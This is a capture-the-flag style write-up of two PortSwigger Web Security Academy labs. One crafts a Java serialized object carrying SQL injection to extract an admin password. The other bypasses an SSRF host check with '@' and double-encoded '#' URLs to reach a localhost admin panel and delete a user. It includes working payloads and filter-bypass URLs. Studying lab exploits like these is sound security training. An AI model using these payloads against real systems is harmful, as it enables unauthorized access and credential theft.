# portswigger
## q1
### Goal: 
-	gain access to the source code
-	construct a gadget chain to obtain admin's password
-	login admin
-	delete Carlos

The question is about Java deserialization, and the first step is to check where tokens (similar to tokens encoded in PHP serialization) are located on the website. There are several places that need to be checked, including the request body, web application storage, and cookies. The Java serialization process is similar to that of PHP, and certain functions are used. KaiBro's "Java 反序列化之 readObject 分析" provides a basic overview of serialization, and Java uses the readObject() function to convert byte sequences into objects. Therefore, we need to find the original class in this question.


### Info
- test account: `wiener:peter`

### Tool
- `burpsuite` : network proxy, api tester, request & response method check and de/encoder.
- `vscode`: Build payload, read source code.
- `diresearch`: scan web path.
### Step 

#### 1.	Use `diresearch` and manually looking for website
	*    manually looking:
        -	`robotx.txt (x)`
        -	`sitemap(x)`
        -	index.html `<!-- <a href=/backup/AccessTokenUser.java>Example user</a> -->`
	*    diresearch:
        ![](https://i.imgur.com/BDpNqG0.png)
	
    

#### 2. 	Found source code in `{url}/backup`
    think:
    Find some info in html, there is a comment in html source code.
    There are two Java source code at backup path.
    Found the user and product template.
    
#### 3.  Login `wiener:peter`
![](https://i.imgur.com/xCuwLSm.png)

```
Set-cookie:  
`session:"rO0ABXNyAC9sYWIuYWN0aW9ucy5jb21tb24uc2VyaWFsaXphYmxlLkFjY2Vzc1Rva2VuVXNlchlR/OUSJ6mBAgACTAALYWNjZXNzVG9rZW50ABJMamF2YS9sYW5nL1N0cmluZztMAAh1c2VybmFtZXEAfgABeHB0ACBmdmw1Y2w3aWEwNmVtNnBudzJpdTlnbmE2eDA3NG0ya3QABndpZW5lcg%3d%3d"
```
The java serilization string contains the prefix `rO0AB..`
So I decoded this cookie using Base64 and confirmed that it is a Java serialization object.

-	decode by base64text: 
`쭀sr/lab.actions.common.serializable.AccessTokenUserQ쥒'遂LaccessTokentLjava/lang/String;Lusernameq~xpt fvl5cl7ia06em6pnw2iu9gna6x074m2ktwiene￷｝` 
	 
	
#### 4.  Building ProductTemplate.java in the source code is a serializable object and overwrites readObject(). 
When trying to rebuild the Java object, we can choose between AccessTokenUser or ProductTemplate, but since ProductTemplate has readObject() and we don't have any other account and password, we choose ProductTemplate to rebuild.
The question hint contains a serialization code, so we use it to generate an attack payload:
![](https://i.imgur.com/1gDkDNB.png)
Other information:

* The database is using PostgreSQL.
* There are no highly vulnerable functions.
* If there is any code like java.lang.getRuntime().exec, it can be used for RCE and reverse a shell, but there are no high-risk functions in this code



#### 5.  Using java serialization to generate ProductTemplate object
    - rebuild `ProductTemplate.java` `test_Main.java`
    - generate some payloads like `' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL--`
#### 6.  sql injection 
ProductTemplate.java:41
` String sql = String.format("SELECT * FROM products WHERE id = '%s' LIMIT 1", id);`
can be exploit by sql injection,

```
Serialized object: rO0ABXNyACNkYXRhLnByb2R1Y3RjYXRhbG9nLlByb2R1Y3RUZW1wbGF0ZQAAAAAAAAABAgABTAACaWR0ABJMamF2YS9sYW5nL1N0cmluZzt4cHQALicgVU5JT04gU0VMRUNUIE5VTEwsTlVMTCxOVUxMLE5VTEwsTlVMTCxOVUxMLS0=
Deserialized object ID: ' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL--
<p class=is-warning>java.io.IOException: org.postgresql.util.PSQLException: ERROR: each UNION query must have the same number of columns Position: 51</p>
```

ref: https://portswigger.net/web-security/sql-injection/cheat-sheet
1. Check about columns count: 8 
2. Check about columns type
3. Check table: `users`
![](https://i.imgur.com/UlkLgbr.png)
3. username: `administrator`![](https://i.imgur.com/K7rSCIK.png)
3. password:`60jdq8ws5bk1yh18khgo`
![](https://i.imgur.com/9mDQMVM.png)


> In other projects, I used sqlmap to test for database injection, but in this case, I used traditional SQL injection testing methods.



#### 7.  Finish work!!!
Login admin and delete Carlos.
![](https://i.imgur.com/ZovoW7W.png)


## q2 
### Goal: 
access `http://localhost/admin`using stockApi to delete `carlos`


### step:
1. Using burp suite to get the normal request.
    `stockApi=http://stock.weliketoshop.net:8080/product/stock/check?productId=1&storeId=1`
    ![](https://i.imgur.com/TiczJCu.png)
    call stockAPI so used this to ssrf

2. Try to call localhost directly. Response shows the uri must have stock.weliketoshop.net 
    `stockApi=http://localhost`
    ![](https://i.imgur.com/fDJte5J.png)

3. Check if 127.0.0.1 can pass? 
    `stockApi=http://127.0.0.1/`
    ![](https://i.imgur.com/pubfT7j.png)

4. Must have `stock.weliketoshop.net`
    ![](https://i.imgur.com/aX9j51n.png)
The previous responses show that the host must be `stock.weliketoshop.net`. I suspect that there is a checker to verify the host. According to the URIGeneric Syntax (also known as [rfc3986](https://www.rfc-editor.org/rfc/rfc398)), the host can be placed after the @ symbol, and before the @ symbol can be user information.

   To make the checker see the host as `stock.weliketoshop.net` and allow the stockApi request sender to access the admin panel, the URI should be written as stockApi=`http://localhost@stock.weliketoshop.net/`. 
   This will pass the host checker.
    ![](https://i.imgur.com/Avu1Rqh.png)

5. The stockAPI cannot request correctly.
    `stockApi=http://localhost/admin@stock.weliketoshop.net`
    ![](https://i.imgur.com/rJTmIQR.png)

6. try to encode `/` but failed.
    `stockApi=http://localhost/admin@stock.weliketoshop.net`
    ![](https://i.imgur.com/6DmjJPE.png)

    `stockApi=http://localhost%25admin@stock.weliketoshop.net`
    `stockApi=http://localhost%252fadmin@stock.weliketoshop.net`
    ![](https://i.imgur.com/dyz8lGY.png)
    Try to `access/admin`  using `/` `%25` `%252f` but can't access.
    These terms still get the Bad Request, so abandon using slash.

7. try to access admin 
    `stockApi=http://localhost@stock.weliketoshop.net/admin`
    ![](https://i.imgur.com/5KyurUz.png)
    Put the `/admin` in the end, the message show we pass the host filter.
    but the web server still can't redirect to `localhost`
    
8. access admin with `#`
    
    `stockApi=http://localhost#@stock.weliketoshop.net/admin/`  failed
    `stockApi=http://localhost%23@stock.weliketoshop.net/admin/` failed
    `stockApi=http://localhost%25%32%33@stock.weliketoshop.net/admin/` successed
    ![](https://i.imgur.com/uIQHPGq.png)
    
    and `stockApi=http://localhost%2523@stock.weliketoshop.net/admin/`is also successed
    ![](https://i.imgur.com/t60nLac.png)
    
    This step is strange. Using `#` and encoding it once cannot allow access, but double encoding can also pass. It's possible that the web server ignores the `#` symbol when it's double encoded and redirects to localhost, but the /admin path after the # symbol is still concatenated, resulting in the URI becoming `http://localhost/admin`.

7. Finish work!!!
    find the delete api and delelte carlos.
    `stockApi=http://localhost%2523%40stock.weliketoshop.net/admin/delete?username=carlos`
    ![](https://i.imgur.com/W81xjzQ.png)
9. test encode`#@` but cannot pass.
`stockApi=http://localhost/admin/%2523%40stock.weliketoshop.net`
![](https://i.imgur.com/nF2ToGf.png)
### epilogue 

According to "A New Era of SSRF - Exploiting URL Parser in Trending Programming Languages!" by Orange Tsai, there are many URL parsers and different programming languages and libraries use different parsing types. Therefore, it's possible that this question also has a different URL parser.




